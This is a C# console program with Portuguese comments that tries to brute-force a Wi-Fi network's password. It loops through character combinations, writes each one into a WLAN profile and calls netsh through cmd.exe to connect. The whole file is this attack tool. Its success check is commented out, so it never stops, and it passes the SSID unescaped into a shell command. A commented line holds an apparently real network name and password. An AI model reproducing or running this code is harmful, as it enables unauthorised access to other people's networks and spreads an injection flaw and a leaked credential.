using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
//*
class Program
{
    static bool passwordCorrect = false;
    static void Main()
    {
        //string ssid = "JNTHN_BRGS"; // Substitua pelo nome da sua rede Wi-Fi
        // Solicitar ao usuário a SSID e a senha
        Console.Write("Digite o nome da rede Wi-Fi (SSID): ");
        string ssid = Console.ReadLine();

        //string password = "20126520";
        
        ////

        char[] characters = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'X', 'Y', 'Z', '/', '=', '*', '!', '@', '#', '_', '-', '%', '&', '(', ')', '+', }; // Você pode adicionar mais caracteres aqui
        int maxLength = 12; // Defina o comprimento máximo das combinações

        for (int length = 1; length <= maxLength && !passwordCorrect; length++)
        {
            foreach (var combination in GenerateCombinations(characters, "", length))
            {
                // Cria o perfil Wi-Fi com a combinação gerada:

                CreateWiFiProfile(ssid, combination);

                
                // Conectar-se à rede Wi-Fi:

                ConnectToWiFi(ssid);
                Console.WriteLine(combination);
                // Verifique se a senha está correta (substitua pelo seu método de verificação)
                if (passwordCorrect)
                {
                    break; // Saia do loop se a senha estiver correta
                }
            }
        }
        ////
        Console.ReadKey();
    }

    static void CreateWiFiProfile(string ssid, string password)
    {
        string profileFilePath = "wifi_profile.xml";

        // Criar o arquivo XML com as credenciais
        System.IO.File.WriteAllText(profileFilePath,
            $"<?xml version=\"1.0\"?>\n" +
            $"<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n" +
            $"  <name>{ssid}</name>\n" +
            $"  <SSIDConfig>\n" +
            $"    <SSID>{ssid}</SSID>\n" +
            $"  </SSIDConfig>\n" +
            $"  <connectionType>ESS</connectionType>\n" +
            $"  <connectionMode>auto</connectionMode>\n" +
            $"  <security>\n" +
            $"    <keyManagement>wpa-psk</keyManagement>\n" +
            $"    <sharedKey>\n" +
            $"      <keyType>passPhrase</keyType>\n" +
            $"      <key>{password}</key>\n" +
            $"    </sharedKey>\n" +
            $"  </security>\n" +
            $"</WLANProfile>");

        // Executar o comando para adicionar o perfil
        ExecuteCommand($"netsh wlan add profile filename=\"{profileFilePath}\"");
    }

    static void ConnectToWiFi(string ssid)
    {
        // Executar o comando para se conectar à rede
        ExecuteCommand($"netsh wlan connect name=\"{ssid}\"");
    }

    static void ExecuteCommand(string command)
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true, // Redirecionar a saída de erro
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();

        // Ler a saída e a saída de erro
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        process.WaitForExit();

        if (process.ExitCode == 0)
        {
            Console.WriteLine($"Comando executado com sucesso: {command}");
            //passwordCorrect = true;
        }
        else
        {
            Console.WriteLine($"Falha ao executar o comando: {command}");
            Console.WriteLine($"Erro: {error}");
        }
    }

    static IEnumerable<string> GenerateCombinations(char[] characters, string prefix, int length)
    {
        if (length == 0)
        {
            yield return prefix; // Retorna a combinação completa
        }
        else
        {
            foreach (char c in characters)
            {
                // Chama recursivamente, reduzindo o comprimento
                foreach (var combination in GenerateCombinations(characters, prefix + c, length - 1))
                {
                    yield return combination; // Retorna cada combinação gerada
                }
            }
        }
    }
}